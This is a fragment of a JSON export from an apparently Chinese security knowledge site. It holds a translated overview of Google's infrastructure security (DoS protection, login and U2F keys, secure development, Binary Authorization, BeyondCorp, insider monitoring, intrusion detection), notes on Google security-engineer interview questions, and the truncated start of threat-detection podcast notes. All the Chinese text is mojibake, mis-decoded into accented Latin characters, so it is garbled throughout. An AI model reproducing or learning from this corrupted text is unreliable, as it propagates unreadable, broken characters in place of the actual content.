åœ°å€æ‰˜ç®¡ã€DoS ä¿æŠ¤å’Œ TLS ç»ˆç»“ã€‚GFE ä¸å…¶ä»–ä»»ä½•æœåŠ¡ä¸€æ ·åœ¨åŸºç¡€æ¶æ„ä¸Šè¿è¡Œå¹¶èƒ½å¤Ÿæ ¹æ®å…¥ç«™è¯·æ±‚é‡è¿›è¡Œè°ƒèŠ‚ã€‚\r\n\r\nGoogle Cloud ä¸Šçš„å®¢æˆ·è™šæ‹Ÿæœºä¸å‘ GFE æ³¨å†Œï¼Œè€Œæ˜¯å‘ Cloud Front End æ³¨å†Œï¼ŒCloud Front End æ˜¯ä½¿ç”¨ Compute Engine ç½‘ç»œå †æ ˆçš„ç‰¹æ®Š GFE é…ç½®ã€‚å€ŸåŠ© Cloud Front Endï¼Œå®¢æˆ·è™šæ‹Ÿæœºå¯ä»¥ä½¿ç”¨å…¶å…¬å…±æˆ–ä¸“ç”¨ IP åœ°å€ç›´æ¥è®¿é—® Google æœåŠ¡ã€‚ï¼ˆåªæœ‰åœ¨å¯ç”¨[ä¸“ç”¨ Google è®¿é—®é€šé“](https://cloud.google.com/vpc/docs/private-google-access?hl=zh-cn)åæ‰èƒ½ä½¿ç”¨ä¸“ç”¨ IP åœ°å€ã€‚ï¼‰\r\n\r\n## DoS é˜²æŠ¤\r\n\r\næˆ‘ä»¬çš„åŸºç¡€æ¶æ„è§„æ¨¡åºå¤§ï¼Œèƒ½å¤ŸæŠµå¾¡è®¸å¤š DoS æ”»å‡»ã€‚ä¸ºäº†è¿›ä¸€æ­¥é™ä½ DoS å¯¹æœåŠ¡çš„å½±å“ï¼Œæˆ‘ä»¬è®¾ç½®äº†å¤šå±‚çº§ DoS é˜²æŠ¤ã€‚\r\n\r\nå½“æˆ‘ä»¬çš„å…‰çº¤éª¨å¹²ç½‘å‘æˆ‘ä»¬å…¶ä¸­ä¸€ä¸ªæ•°æ®ä¸­å¿ƒä¼ é€å¤–éƒ¨è¿æ¥æ—¶ï¼Œè¯¥è¿æ¥ä¼šç»è¿‡å¤šå±‚ç¡¬ä»¶å’Œè½¯ä»¶è´Ÿè½½å‡è¡¡å™¨ã€‚è¿™äº›è´Ÿè½½å‡è¡¡å™¨ä¼šå°†æœ‰å…³å…¥ç«™æµé‡çš„ä¿¡æ¯æŠ¥å‘Šç»™åœ¨åŸºç¡€æ¶æ„ä¸Šè¿è¡Œçš„ä¸­å¤® DoS æœåŠ¡ã€‚å½“ä¸­å¤® DoS æœåŠ¡æ£€æµ‹åˆ° DoS æ”»å‡»æ—¶ï¼Œè¯¥æœåŠ¡å¯ä»¥é…ç½®è´Ÿè½½å‡è¡¡å™¨ï¼Œä»¥é™ä½æˆ–é™åˆ¶ä¸æ”»å‡»ç›¸å…³çš„æµé‡ã€‚\r\n\r\nGFE å®ä¾‹è¿˜ä¼šå°†å®ƒä»¬æ­£åœ¨æ¥æ”¶çš„è¯·æ±‚çš„ç›¸å…³ä¿¡æ¯æŠ¥å‘Šç»™ä¸­å¤® DoS æœåŠ¡ï¼ŒåŒ…æ‹¬è´Ÿè½½å‡è¡¡å™¨æ— æƒè®¿é—®çš„åº”ç”¨å±‚ä¿¡æ¯ã€‚ç„¶åï¼Œä¸­å¤® DoS æœåŠ¡ä¾¿å¯ä»¥é…ç½® GFE å®ä¾‹ï¼Œä»¥é™ä½æˆ–é™åˆ¶æ”»å‡»æµé‡ã€‚\r\n\r\n## ç”¨æˆ·èº«ä»½éªŒè¯\r\n\r\nåœ¨ DoS é˜²æŠ¤ä¹‹åï¼Œå®‰å…¨é€šä¿¡çš„ä¸‹ä¸€å±‚é˜²å¾¡æ¥è‡ªä¸­å¤®èº«ä»½è¯†åˆ«æœåŠ¡ã€‚æœ€ç»ˆç”¨æˆ·é€šè¿‡ Google ç™»å½•é¡µé¢ä¸æ­¤æœåŠ¡äº¤äº’ã€‚è¯¥æœåŠ¡è¦æ±‚æä¾›ç”¨æˆ·åå’Œå¯†ç ï¼Œè¿˜å¯ä»¥æ ¹æ®é£é™©å› ç´ è¦æ±‚ç”¨æˆ·æä¾›å…¶ä»–ä¿¡æ¯ã€‚é£é™©å› ç´ ç¤ºä¾‹åŒ…æ‹¬ç”¨æˆ·è¿‡å»æ˜¯å¦ä»åŒä¸€è®¾å¤‡æˆ–ç±»ä¼¼ä½ç½®ç™»å½•è¿‡ã€‚åœ¨å¯¹ç”¨æˆ·è¿›è¡Œèº«ä»½éªŒè¯ä¹‹åï¼Œèº«ä»½è¯†åˆ«æœåŠ¡ä¼šé¢å‘ Cookie å’Œ OAuth ä»¤ç‰Œç­‰å‡­æ®ï¼Œä¾›åç»­è°ƒç”¨æ—¶ä½¿ç”¨ã€‚\r\n\r\nç”¨æˆ·ç™»å½•æ—¶ï¼Œä»–ä»¬å¯ä»¥ä½¿ç”¨ç¬¬äºŒé‡èº«ä»½éªŒè¯ï¼Œä¾‹å¦‚åŠ¨æ€å¯†ç æˆ–é˜²é’“é±¼å®‰å…¨å¯†é’¥ï¼ˆä¾‹å¦‚ [Titan å®‰å…¨å¯†é’¥](https://cloud.google.com/titan-security-key?hl=zh-cn)ï¼‰ã€‚Titan å®‰å…¨å¯†é’¥æ˜¯æ”¯æŒ [FIDO Universal 2nd Factor (U2F)](https://en.wikipedia.org/wiki/Universal_2nd_Factor) çš„ç‰©ç†ä»¤ç‰Œã€‚æˆ‘ä»¬ä¸ FIDO Alliance åä½œå¼€å‘ U2F å¼€æ”¾æ ‡å‡†ã€‚å¤§å¤šæ•°ç½‘ç»œå¹³å°å’Œæµè§ˆå™¨éƒ½é‡‡ç”¨æ­¤å¼€æ”¾èº«ä»½éªŒè¯æ ‡å‡†ã€‚\r\n\r\n# è¿è¥å®‰å…¨\r\n\r\næœ¬éƒ¨åˆ†ä»‹ç»æˆ‘ä»¬å¦‚ä½•å¼€å‘åŸºç¡€æ¶æ„è½¯ä»¶ï¼Œä¿æŠ¤å‘˜å·¥çš„æœºå™¨åŠå‡­æ®ï¼Œä»¥åŠé˜²èŒƒæ¥è‡ªå†…éƒ¨äººå‘˜å’Œå¤–éƒ¨æ”»å‡»è€…çš„åŸºç¡€æ¶æ„å¨èƒã€‚\r\n\r\n## å®‰å…¨çš„è½¯ä»¶å¼€å‘\r\n\r\né™¤äº†å‰é¢ä»‹ç»çš„[æºä»£ç æ§åˆ¶ä¿æŠ¤æœºåˆ¶å’ŒåŒæ–¹å®¡æ ¸æµç¨‹](https://cloud.google.com/docs/security/infrastructure/design?hl=zh-cn#secure-service)ä¹‹å¤–ï¼Œæˆ‘ä»¬è¿˜ä½¿ç”¨åº“æ¥é˜²æ­¢å¼€å‘è€…å¼•å…¥æŸäº›å®‰å…¨ bugã€‚ä¾‹å¦‚ï¼Œæˆ‘ä»¬æ‹¥æœ‰å¯å¸®åŠ© Web åº”ç”¨é¿å… XSS æ¼æ´çš„åº“å’Œæ¡†æ¶ï¼Œæˆ‘ä»¬è¿˜ä½¿ç”¨æ¨¡ç³Šæµ‹è¯•å·¥å…·ã€é™æ€åˆ†æå·¥å…·å’Œç½‘ç»œå®‰å…¨æ‰«æå·¥å…·ç­‰è‡ªåŠ¨åŒ–å·¥å…·æ¥è‡ªåŠ¨æ£€æµ‹å®‰å…¨ bugã€‚\r\n\r\næˆ‘ä»¬ä¼šè¿›è¡Œäººå·¥å®‰å…¨å®¡æ ¸ä»¥ä½œä¸ºæœ€ç»ˆæ£€æŸ¥ï¼Œå®¡æ ¸èŒƒå›´ä»å¯¹è¾ƒä½é£é™©çš„åŠŸèƒ½è¿›è¡Œå¿«é€Ÿåˆ†ç±»ï¼Œåˆ°å¯¹æœ€é«˜é£é™©çš„åŠŸèƒ½åœ¨è®¾è®¡å’Œå®æ–½ä¸Šè¿›è¡Œæ·±å…¥å®¡æ ¸ã€‚æ‰§è¡Œè¿™äº›å®¡æ ¸çš„å›¢é˜ŸåŒ…æ‹¬ç½‘ç»œå®‰å…¨ã€åŠ å¯†å’Œæ“ä½œç³»ç»Ÿå®‰å…¨é¢†åŸŸçš„ä¸“å®¶ã€‚è¿™äº›å®¡æ ¸å¯ä»¥å¸®åŠ©æˆ‘ä»¬å¼€å‘æ–°çš„å®‰å…¨åº“åŠŸèƒ½å’Œæ–°çš„æ¨¡ç³Šæµ‹è¯•å·¥å…·ï¼Œä»è€Œç”¨äºæœªæ¥çš„äº§å“ã€‚\r\n\r\næ­¤å¤–ï¼Œæˆ‘ä»¬è¿˜å®æ–½äº†[æ¼æ´å¥–åŠ±è®¡åˆ’](https://www.google.com/about/appsecurity/reward-program/?hl=zh-cn)ï¼Œå¯¹å‘ç°å¹¶æŠ¥å‘Šæˆ‘ä»¬åŸºç¡€æ¶æ„æˆ–åº”ç”¨ä¸­çš„ bug çš„ä»»ä½•äººå£«è¿›è¡Œå¥–åŠ±ã€‚å¦‚éœ€è¯¦ç»†äº†è§£æ­¤è®¡åˆ’ï¼ŒåŒ…æ‹¬æˆ‘ä»¬æä¾›çš„å¥–åŠ±ï¼Œè¯·æŸ¥çœ‹ [Bug Hunters å…³é”®æ•°æ®](https://bughunters.google.com/about/key-stats?hl=zh-cn)ã€‚\r\n\r\næ­¤å¤–ï¼Œæˆ‘ä»¬è¿˜è‡´åŠ›äºå‘ç°æˆ‘ä»¬ä½¿ç”¨çš„å¼€æºè½¯ä»¶çš„é›¶æ—¥æ¼æ´å’Œå…¶ä»–å®‰å…¨é—®é¢˜ã€‚æˆ‘ä»¬çš„ [Project Zero](https://googleprojectzero.blogspot.com/) å›¢é˜Ÿç”± Google ç ”ç©¶äººå‘˜ç»„æˆï¼Œä»–ä»¬ä¸“é—¨ç ”ç©¶åŒ…æ‹¬ [Spectre å’Œ Meltdown](https://googleprojectzero.blogspot.com/search?q=spectre) åœ¨å†…çš„é›¶æ—¥æ¼æ´ã€‚æˆ‘ä»¬æ˜¯ä¸º Linux KVM Hypervisor æäº¤æœ€å¤š CVE å’Œå®‰å…¨ bug ä¿®å¤çš„å…¬å¸ã€‚\r\n\r\n## æºä»£ç ä¿æŠ¤\r\n\r\næˆ‘ä»¬çš„æºä»£ç å­˜å‚¨åœ¨å…·æœ‰å†…ç½®æºå®Œæ•´æ€§å’Œæ²»ç†çš„ä»£ç åº“ä¸­ï¼Œå¯ä»¥åœ¨å…¶ä¸­å®¡æ ¸æœåŠ¡çš„å½“å‰ç‰ˆæœ¬å’Œè¿‡å»ç‰ˆæœ¬ã€‚åŸºç¡€æ¶æ„è¦æ±‚æœåŠ¡çš„äºŒè¿›åˆ¶æ–‡ä»¶åŸºäºç»è¿‡å®¡æ ¸ã€ç™»è®°å’Œæµ‹è¯•çš„ç‰¹å®šæºä»£ç æ„å»ºã€‚[Binary Authorization for Borg (BAB)](https://cloud.google.com/docs/security/binary-authorization-for-borg?hl=zh-cn) æ˜¯éƒ¨ç½²æœåŠ¡æ—¶è¿›è¡Œçš„å†…éƒ¨å¼ºåˆ¶æ‰§è¡Œæ£€æŸ¥ã€‚BAB å‘æŒ¥ä»¥ä¸‹ä½œç”¨ï¼š\r\n\r\n- ç¡®ä¿ Google ä¸Šéƒ¨ç½²çš„ç”Ÿäº§è½¯ä»¶å’Œé…ç½®ç»è¿‡å®¡æ ¸å’Œæˆæƒï¼Œå°¤å…¶æ˜¯åœ¨ä»£ç å¯ä»¥è®¿é—®ç”¨æˆ·æ•°æ®æ—¶ã€‚\r\n- ç¡®ä¿ä»£ç å’Œé…ç½®éƒ¨ç½²æ»¡è¶³ç‰¹å®šçš„æœ€ä½æ ‡å‡†ã€‚\r\n- é˜²æ­¢å†…éƒ¨äººå‘˜æˆ–æ”»å‡»è€…æ¶æ„ä¿®æ”¹æºä»£ç ï¼Œå¹¶å®ç°ä»æœåŠ¡å›æº¯åˆ°å…¶æºä»£ç çš„å–è¯è·Ÿè¸ªã€‚\r\n\r\n## ç¡®ä¿å‘˜å·¥è®¾å¤‡åŠå‡­æ®çš„å®‰å…¨\r\n\r\næˆ‘ä»¬å®æ–½ä¿æŠ¤æªæ–½ï¼Œä½¿å‘˜å·¥çš„è®¾å¤‡å’Œå‡­æ®å…é­ç ´è§£ã€‚ä¸ºäº†å¸®åŠ©å‘˜å·¥é˜²èŒƒå¤æ‚çš„ç½‘ä¸Šè¯±éª—æ´»åŠ¨ï¼Œæˆ‘ä»¬å¼ºåˆ¶ä½¿ç”¨ä¸ U2F å…¼å®¹çš„å®‰å…¨å¯†é’¥æ¥å–ä»£åŠ¨æ€å¯†ç åŒé‡èº«ä»½éªŒè¯ã€‚\r\n\r\næˆ‘ä»¬ç›‘æ§å‘˜å·¥ç”¨äºè¿è¡ŒåŸºç¡€æ¶æ„çš„å®¢æˆ·ç«¯è®¾å¤‡ã€‚æˆ‘ä»¬ç¡®ä¿è®¾å¤‡çš„æ“ä½œç³»ç»Ÿæ˜ åƒå…·æœ‰æœ€æ–°çš„å®‰å…¨è¡¥ä¸ï¼Œå¹¶ä¸”æ§åˆ¶å‘˜å·¥å¯ä»¥åœ¨å…¶è®¾å¤‡ä¸Šå®‰è£…çš„åº”ç”¨ã€‚æˆ‘ä»¬è¿˜åˆ©ç”¨ç³»ç»Ÿæ¥æ‰«æç”¨æˆ·å®‰è£…çš„åº”ç”¨ã€ä¸‹è½½é¡¹ã€æµè§ˆå™¨æ‰©å±•ç¨‹åºå’Œç½‘ç»œæµè§ˆå™¨å†…å®¹ï¼Œä»¥ç¡®å®šå®ƒä»¬æ˜¯å¦é€‚åˆä¼ä¸šè®¾å¤‡ã€‚\r\n\r\nè¿æ¥åˆ°ä¼ä¸š LAN ä¸æ˜¯æˆ‘ä»¬ç”¨äºå†³å®šæˆäºˆè®¿é—®æƒé™çš„ä¸»è¦æœºåˆ¶ã€‚æˆ‘ä»¬ä½¿ç”¨é›¶ä¿¡ä»»å®‰å…¨æ€§æ¥ä¿æŠ¤å‘˜å·¥å¯¹èµ„æºçš„è®¿é—®ã€‚ä»…å½“å‘˜å·¥ä½¿ç”¨å—ç®¡è®¾å¤‡å¹¶ä»æŒ‡å®šç½‘ç»œå’Œåœ°ç†ä½ç½®è¿æ¥æ—¶ï¼Œåº”ç”¨çº§åˆ«çš„è®¿é—®ç®¡ç†æ§åˆ¶æœºåˆ¶æ‰ä¼šå‘å‘˜å·¥å…¬å¼€å†…éƒ¨åº”ç”¨ã€‚å®¢æˆ·ç«¯è®¾å¤‡åŸºäºé¢å‘ç»™å…·ä½“æœºå™¨çš„è¯ä¹¦ä»¥åŠå…³äºå…¶é…ç½®çš„æ–­è¨€ï¼ˆä¾‹å¦‚æœ€æ–°è½¯ä»¶ï¼‰è·å¾—ä¿¡ä»»ã€‚å¦‚éœ€äº†è§£è¯¦æƒ…ï¼Œè¯·å‚é˜… [BeyondCorp](https://cloud.google.com/beyondcorp?hl=zh-cn)ã€‚\r\n\r\n## é™ä½æ¥è‡ªå†…éƒ¨äººå‘˜çš„é£é™©\r\n\r\næˆ‘ä»¬é™åˆ¶å¹¶ä¸»åŠ¨ç›‘æ§æ‹¥æœ‰åŸºç¡€æ¶æ„ç®¡ç†å‘˜æƒé™çš„å‘˜å·¥çš„æ´»åŠ¨ã€‚é€šè¿‡æŒç»­çš„åŠªåŠ›ï¼Œæˆ‘ä»¬ä¸å†éœ€è¦é’ˆå¯¹ç‰¹å®šä»»åŠ¡æˆäºˆç‰¹åˆ«è®¿é—®æƒé™ï¼Œè€Œæ˜¯èƒ½å¤Ÿä»¥å®‰å…¨å¯æ§çš„æ–¹å¼è‡ªåŠ¨å®ŒæˆåŒæ ·çš„ä»»åŠ¡ã€‚ä¾‹å¦‚ï¼Œå¯¹äºæŸäº›æ“ä½œæˆ‘ä»¬è¦æ±‚åŒæ–¹æ‰¹å‡†ï¼Œä»¥åŠæˆ‘ä»¬å¯ä»¥ä½¿ç”¨æœ‰é™çš„ API åœ¨ä¸æš´éœ²æ•æ„Ÿä¿¡æ¯çš„æƒ…å†µä¸‹è¿›è¡Œè°ƒè¯•ã€‚\r\n\r\nGoogle å‘˜å·¥å¯¹æœ€ç»ˆç”¨æˆ·ä¿¡æ¯çš„è®¿é—®æƒ…å†µå¯é€šè¿‡åº•å±‚åŸºç¡€æ¶æ„é’©å­è¿›è¡Œè®°å½•ã€‚æˆ‘ä»¬çš„å®‰å…¨å›¢é˜Ÿä¼šç›‘æ§è®¿é—®æ¨¡å¼å¹¶è°ƒæŸ¥å¼‚å¸¸äº‹ä»¶ã€‚\r\n\r\n## å¨èƒç›‘æ§\r\n\r\nGoogle çš„[å¨èƒåˆ†æå°ç»„](https://blog.google/threat-analysis-group/?hl=zh-cn)ä¼šç›‘æ§å¨èƒå‘èµ·è€…åŠå…¶ç­–ç•¥å’ŒæŠ€æœ¯çš„æ¼”å˜ã€‚è¿™ä¸ªå°ç»„çš„ç›®æ ‡æ˜¯æé«˜ Google äº§å“çš„å®‰å…¨æ€§ï¼Œå¹¶å‘åœ¨çº¿ç¤¾åŒºå…±äº«è¿™äº›æƒ…æŠ¥ã€‚\r\n\r\nå¯¹äº Google Cloudï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ [Google Cloud Threat Intelligence for Chronicle](https://chronicle.security/products/uppercase/) å’Œ [VirusTotal](https://support.virustotal.com/hc/en-us/categories/360000162878-Documentation) æ¥ç›‘æ§å’Œåº”å¯¹å¤šç§ç±»å‹çš„æ¶æ„è½¯ä»¶ã€‚Google Cloud Threat Intelligence for Chronicle æ˜¯ä¸€ä¸ªå¨èƒç ”ç©¶å›¢é˜Ÿï¼Œç ”ç©¶äººå‘˜å¼€å‘ç”¨äº [Chronicle](https://cloud.google.com/chronicle/docs/overview?hl=zh-cn) çš„å¨èƒæƒ…æŠ¥ã€‚VirusTotal æ˜¯ä¸€ä¸ªæ¶æ„è½¯ä»¶æ•°æ®åº“å’Œå¯è§†åŒ–è§£å†³æ–¹æ¡ˆï¼Œæ‚¨å¯ä»¥é€šè¿‡å®ƒæ›´å¥½åœ°äº†è§£æ¶æ„è½¯ä»¶åœ¨æ‚¨ä¼ä¸šä¸­çš„è¿è¡Œæ–¹å¼ã€‚\r\n\r\nå¦‚éœ€è¯¦ç»†äº†è§£æˆ‘ä»¬çš„å¨èƒç›‘æ§æ´»åŠ¨ï¼Œè¯·å‚é˜…[å¨èƒæƒ…æŠ¥æŠ¥å‘Š](https://cloud.google.com/blog/products/identity-security/coin-mining-ransomware-apts-target-cloud-gcat-report?hl=zh-cn)ã€‚\r\n\r\n## å…¥ä¾µæ£€æµ‹\r\n\r\næˆ‘ä»¬ä½¿ç”¨å¤æ‚çš„æ•°æ®å¤„ç†æµæ°´çº¿æ¥é›†æˆå„ä¸ªè®¾å¤‡ä¸ŠåŸºäºä¸»æœºçš„ä¿¡å·ã€æ¥è‡ªåŸºç¡€æ¶æ„ä¸­å„ä¸ªç›‘æ§ç‚¹çš„åŸºäºç½‘ç»œçš„ä¿¡å·ï¼Œä»¥åŠæ¥è‡ªåŸºç¡€æ¶æ„æœåŠ¡çš„ä¿¡å·ã€‚æ„å»ºäºè¿™äº›æµæ°´çº¿ä¹‹ä¸Šçš„è§„åˆ™å’Œæœºå™¨æ™ºèƒ½ä¼šå‘è¿è¥å®‰å…¨å·¥ç¨‹å¸ˆå‘å‡ºæ½œåœ¨çªå‘äº‹ä»¶è­¦å‘Šã€‚[æˆ‘ä»¬çš„è°ƒæŸ¥å’Œçªå‘äº‹ä»¶å“åº”å›¢é˜Ÿ](https://cloud.google.com/docs/security/incident-response?hl=zh-cn)ä¼šä¸€å¹´ 365 å¤©ã€ä¸€å¤© 24 å°æ—¶å…¨å¤©å€™åœ°å¯¹è¿™äº›æ½œåœ¨çªå‘äº‹ä»¶è¿›è¡Œåˆ†ç±»ã€è°ƒæŸ¥å’Œå“åº”ã€‚æˆ‘ä»¬æ•ˆä»¿ [Red Team](https://en.wikipedia.org/wiki/Red_team) çš„åšæ³•æ¥è¡¡é‡å’Œæ”¹å–„æˆ‘ä»¬çš„æ£€æµ‹ä¸å“åº”æœºåˆ¶çš„æœ‰æ•ˆæ€§ã€‚\r\n\r\n# åç»­æ­¥éª¤\r\n\r\n- å¦‚éœ€è¯¦ç»†äº†è§£æˆ‘ä»¬å¦‚ä½•ä¿æŠ¤æˆ‘ä»¬çš„åŸºç¡€æ¶æ„ï¼Œè¯·å‚é˜…[ã€Šæ„å»ºå®‰å…¨å¯é çš„ç³»ç»Ÿã€‹ï¼ˆO'Reilly ä¹¦ç±ï¼‰](https://www.oreilly.com/library/view/building-secure-and/9781492083115/)ã€‚\r\n- è¯¦ç»†äº†è§£[æ•°æ®ä¸­å¿ƒå®‰å…¨æ€§](https://www.google.com/about/datacenters/data-security/?hl=zh-cn)ã€‚\r\n- è¯¦ç»†äº†è§£æˆ‘ä»¬å¦‚ä½•é˜²èŒƒ [DDoS æ”»å‡»](https://cloud.google.com/blog/products/identity-security/identifying-and-protecting-against-the-largest-ddos-attacks?hl=zh-cn)ã€‚\r\n- äº†è§£æˆ‘ä»¬çš„é›¶ä¿¡ä»»è§£å†³æ–¹æ¡ˆ [BeyondCorp](https://cloud.google.com/beyondcorp?hl=zh-cn)ã€‚\r\n\r\n# å‚è€ƒèµ„æ–™\r\n- [https://cloud.google.com/docs/security/infrastructure/design](https://cloud.google.com/docs/security/infrastructure/design)"},{"fields":{"slug":"/å®‰å…¨çŸ¥è¯†åº“/è¡Œä¸šè§‚å¯Ÿ/Google/Google å®‰å…¨å·¥ç¨‹å¸ˆé¢è¯•/","title":"Google åŸºç¡€è®¾æ–½å®‰å…¨è®¾è®¡"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: Google åŸºç¡€è®¾æ–½å®‰å…¨è®¾è®¡\r\ntags:\r\n- è¡Œä¸šè§‚å¯Ÿ\r\n- Google\r\n- é¢è¯•\r\n---\r\n\r\næ— æ„é—´çœ‹åˆ°ä¸€ä¸ªå°å“¥åˆ†äº«åœ¨Googleæ±‚èŒçš„è¿‡ç¨‹ï¼Œé‡Œé¢å…³äºé¢è¯•è¿™éƒ¨åˆ†å¾ˆæœ‰æ„æ€ï¼Œè®°å½•å¦‚ä¸‹ï¼š\r\n\r\n# 1. Key Insight\r\n\r\n- é¢è¯•é€šçŸ¥é‚®ä»¶çš„æŒ‡å¼•éå¸¸æ¸…æ™°ï¼šæå‰äº†è§£å€™é€‰äººçš„èƒŒæ™¯/æŠ€æœ¯æ ˆï¼Œæ ¹æ®ä¸ªäººæƒ…å†µæ¥è°ƒæ•´é¢è¯•é—®é¢˜\r\n- ç¡…è°·å¤§å‚ä¸€èˆ¬éƒ½å–œæ¬¢é—®å†™ä»£ç çš„èƒ½åŠ›å’Œsystem designï¼Œåœ¨Googleè¿™é‡Œä¹Ÿå¾—åˆ°äº†ç¡®è®¤\r\n\r\n# 2. é¢è¯•ç¡®è®¤é‚®ä»¶\r\n\r\n![Sxnzub](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2022-12/Sxnzub.jpg)\r\n![qh73sw](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2022-12/qh73sw.jpg)\r\n\r\n# 3. é¢è¯•é—®é¢˜\r\n\r\n- ã€è€ƒå¨èƒå»ºæ¨¡ã€‘ä¼—æ‰€å‘¨çŸ¥ï¼Œå›¾åƒè§£æåº“ä¸­å­˜åœ¨å®‰å…¨é—®é¢˜ï¼ˆå¦‚ Buffer overflowï¼‰ï¼Œæ‚¨å¿…é¡»è®¾è®¡ä¸€ä¸ªè§£æå›¾åƒçš„å®‰å…¨åº“ï¼Œç¡®ä¿å…¶ä¸­ä¸å­˜åœ¨å®‰å…¨æ¼æ´ï¼Œæ‚¨å°†å¦‚ä½•è®¾è®¡å®ƒï¼Ÿ\r\n- ã€è€ƒå®‰å…¨æ¶æ„/è®¾è®¡ã€‘ä¸ºæ‰€æœ‰éœ€è¦ç™»å½•çš„è°·æ­ŒæœåŠ¡ï¼ˆä¾‹å¦‚ youtubeï¼‰è®¾è®¡å•ç‚¹ç™»å½•ç³»ç»Ÿ\r\n- ã€è€ƒåŸºç¡€çŸ¥è¯†ã€‘å¦‚ä½•åœ¨ä¸ä½¿ç”¨ç¼–ç å’Œå…è®¸ä½¿ç”¨ javascript çš„æƒ…å†µä¸‹é˜²æ­¢ XSSï¼Ÿ\r\n- ã€è€ƒä¸ªäººç»éªŒã€‘åˆ†äº«ä½ çš„ fuzzing ç»éªŒï¼Ÿ\r\n- ã€è€ƒåŸºç¡€çŸ¥è¯†ã€‘åŒæºç­–ç•¥çš„èµ·æºæ˜¯ä»€ä¹ˆï¼Ÿ\r\n\r\n# 4. æ¥æº\r\n\r\n- [https://haiderm.com/my-experience-with-google-interview-for-information-security-engineer/](https://haiderm.com/my-experience-with-google-interview-for-information-security-engineer/)"},{"fields":{"slug":"/å®‰å…¨çŸ¥è¯†åº“/è¡Œä¸šè§‚å¯Ÿ/Google/Modern Threat Detection at Google/","title":"Google åŸºç¡€è®¾æ–½å®‰å…¨è®¾è®¡"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: Google åŸºç¡€è®¾æ–½å®‰å…¨è®¾è®¡\r\ntags:\r\n- è¡Œä¸šè§‚å¯Ÿ\r\n- Google\r\n- å¨èƒæ£€æµ‹\r\n---\r\n\r\n\r\n# èƒŒæ™¯\r\n\r\n- å†…å®¹æ¥è‡ªGoogle cloud security podcastï¼ŒEP# 17\r\n- https://cloud.withgoogle.com/cloudsecurity/podcast/modern-threat-detection-at-google/\r\n\r\n# åšå®¢å˜‰å®¾\r\n\r\n- **TimPeacock,** Google Cloud å¨èƒæ£€æµ‹äº§å“ç»ç†ã€‚\r\n- **Anton Chuvakin,** å‰Gartneråˆ†æå¸ˆï¼Œåæ¥åŠ å…¥Alphabetå­å…¬å¸Chronicleï¼Œç°Google Cloud å®‰å…¨è§£å†³æ–¹æ¡ˆä¸“å®¶ã€‚\r\n- **Julien Vehent,** Google æ£€æµ‹å“åº”(Detection and Response)å›¢é˜Ÿè´Ÿè´£äººã€‚\r\n\r\n# æ€»ç»“\r\n\r\n- å¨èƒæ£€æµ‹çš„å®šä¹‰ï¼š**å°†å¨èƒç›¸å…³çš„çŸ¥è¯†è½¬æ¢ä¸ºæ£€æµ‹èƒ½åŠ›**ï¼ˆthread detection is really how the **threat knowledge becomes detections**ï¼‰ã€‚\r\n\r\n- ### Googleæ‰€å¤„çš„ç¯å¢ƒæ˜¯æ€æ ·çš„ï¼Ÿ\r\n\r\n  - Googleå¾ˆå¤šä¸šåŠ¡éƒ½ä¸Šäº‘äº†ï¼Œäº‘ç¯å¢ƒå’Œä¼ ç»ŸIDCçš„å¾ˆå¤§åŒºåˆ«åœ¨äºï¼š\r\n    - æ§åˆ¶å¹³é¢ï¼ˆIAMï¼‰çš„ä¸åŒï¼Œæ³„éœ²AK/SKæ„å‘³ç€ç³»ç»Ÿè¢«å®Œå…¨æ§åˆ¶ã€‚\r\n    - äº‘ç¯å¢ƒä¸‹çš„æ”»å‡»é¢è¦å°å¾ˆå¤šï¼Œäº‘å¹³å°åšäº†å¾ˆå¤šsecure by defaultçš„ä¸œè¥¿ã€‚\r\n    - å®‰å…¨å›¢é˜Ÿå¯ä»¥é›†ä¸­åŠ›é‡åœ¨é«˜çº§å¨èƒæ£€æµ‹ä¸Šï¼Œè€Œä¸å¹¶æµªè´¹æ—¶é—´åœ¨åŸºç¡€é¢†åŸŸï¼ˆå¦‚æ¼æ´/è¡¥ä¸ç®¡ç†ã€IOCè¿è¥ç­‰ï¼‰ã€‚\r\n\r\n- ### Googleæ˜¯å¦‚ä½•å°†å¨èƒç›¸å…³çš„çŸ¥è¯†è½¬æ¢ä¸ºæ£€æµ‹èƒ½åŠ›çš„ï¼Ÿ\r\n\r\n  - åŸºæœ¬å¸ˆä»å®‰å…¨çš„ä¸‰å¤§æ”¯æŸ±ï¼ˆäººå‘˜ã€æµç¨‹å’ŒæŠ€æœ¯ï¼‰æ¥è®²çš„\r\n    - **äººå‘˜**\r\n      - å¿…é¡»å…·å¤‡ä»£ç èƒ½åŠ›ï¼Œåœ¨äº‘ç¯å¢ƒä¸‹è¿›è¡Œå¨èƒæ£€æµ‹æ„å‘³ç€æ¯å¤©éƒ½åœ¨å†™ä»£ç ã€‚\r\n      - æ‹¥æœ‰å¥½å¥‡å¿ƒå’Œé€»è¾‘æ€ç»´èƒ½åŠ›ï¼Œèƒ½ä¸æ–­æå‡ºé—®é¢˜ï¼Œä¸æ–­é—®ä¸ºä»€ä¹ˆï¼Œç›´åˆ°å¾—å‡ºä¸€ä¸ªå‡è®¾ï¼Œç»“æœè¯æ˜å­˜åœ¨ä¸€ä¸ªæ½œåœ¨çš„æ¼æ´ã€‚\r\n      - ç±»ä¼¼code reviewï¼ŒåŒä¸€ä¸ªå‘Šè­¦æ—¥å¿—éœ€è¦æœ‰å¤šä¸ªäººæ¥æ’æŸ¥ï¼Œå¯èƒ½ä¼šå¾—å‡ºä¸åŒçš„ç»“è®ºã€‚\r\n      - å†™æ£€æµ‹è§„åˆ™å’Œåšåº”æ€¥å“åº”çš„æ˜¯åŒä¸€ä¸ªäºº/å›¢é˜Ÿ**ï¼ˆå¦‚æœä½ ä¸è´Ÿè´£è®¾è®¡å¦‚ä½•å‘Šè­¦ï¼Œä½ ä¼šçœŸå…³å¿ƒå®ƒæ˜¯å¦åœ¨å‡Œæ™¨ 02:00 è§¦å‘å—ï¼Ÿï¼‰**\r\n    - **æµç¨‹**\r\n      - 